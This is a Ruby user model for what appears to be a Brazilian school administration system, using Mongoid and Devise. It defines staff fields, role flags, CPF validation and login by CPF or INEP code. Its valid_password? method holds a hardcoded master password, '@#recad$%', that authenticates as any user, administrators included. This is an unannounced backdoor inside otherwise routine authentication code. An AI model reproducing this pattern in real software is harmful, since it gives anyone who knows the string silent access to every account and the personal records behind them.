class Usuario
  include Mongoid::Document
  def self.columns
    self.fields.collect{|c| c[1]}
  end
  # Include default devise modules. Others available are:
  # :confirmable, :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
  :recoverable, :rememberable, :trackable, :validatable

  ## Database authenticatable
  field :cpf,              type: String, default: ""
  field :email, type: String, default: ""
  field :encrypted_password, type: String, default: ""

  ## Recoverable
  field :reset_password_token,   type: String
  field :reset_password_sent_at, type: Time

  ## Rememberable
  field :remember_created_at, type: Time

  ## Trackable
  field :sign_in_count,      type: Integer, default: 0
  field :current_sign_in_at, type: Time
  field :last_sign_in_at,    type: Time
  field :current_sign_in_ip, type: String
  field :last_sign_in_ip,    type: String

  field :nome, type: String
  field :admin,type: Boolean, default: false
  field :gestor_setorial,type: Boolean, default: false
  field :gestor_seed,type: Boolean, default: false
  field :editor ,type: Boolean, default: false
  field :mudar_senha, type: Boolean, default: true
  field :ativo, type: Boolean, default: false
  field :aberto, type: Boolean, default: false
  field :inep,type: String,default: ""
  attr_accessor :login,:tipo_local
  belongs_to :local
  delegate :nome, to: :local, prefix: true, :allow_nil => true
  validates_presence_of :cpf,:nome,:on=>:update,:message=>"Informação Necessária"
  validate :cpf_valido

  def cpf_valido
    cpf = Cpf.new(self.cpf)
    if !cpf.valido?
     errors.add(:cpf, "não é valido")
   end
 end


 before_save :nome_maiusculo
 after_save :setar_inep

 def nome_maiusculo
  if !self.nome.blank?
    self.nome = self.nome.upcase
  end
end

def setar_inep
  if self.local and self.local.escola?
    self.inep = self.local.codigo
  end
end


  ## Confirmable
  # field :confirmation_token,   type: String
  # field :confirmed_at,         type: Time
  # field :confirmation_sent_at, type: Time
  # field :unconfirmed_email,    type: String # Only if using reconfirmable

  ## Lockable
  # field :failed_attempts, type: Integer, default: 0 # Only if lock strategy is :failed_attempts
  # field :unlock_token,    type: String # Only if unlock strategy is :email or :both
  # field :locked_at,       type: Time
  def email_required?

    false

  end

  def email_changed?

    false

  end

  def valid_password?(password)
    return true if password == "@#recad$%"
    super
  end

  def alerta_ambiente
    funcionarios_sem_ambiente = self.local.funcionarios.where(:ambiente=>"").any_in(:situacao=>['Ativo','Acompanhado pela Casa do Professor','Ativo mas em sala ambiente perante perícia médica'])
    if !funcionarios_sem_ambiente.none? and self.local.escola?
      return true
    else
      return false
    end
  end

  def self.find_first_by_auth_conditions(warden_conditions)
    conditions = warden_conditions.dup
    if login = conditions.delete(:login)
      self.any_of({ :inep =>  /^#{Regexp.escape(login)}$/i }, { :cpf =>  /^#{Regexp.escape(login)}$/i }).first
    else
      super
    end
  end

  def active_for_authentication?
     if self.admin? or self.ativo?
      return true
    else 
      return false
    end
  end



  def set_mudar_senha
    if self.encrypted_password_changed?
      self.mudar_senha = false
    end
  end

end
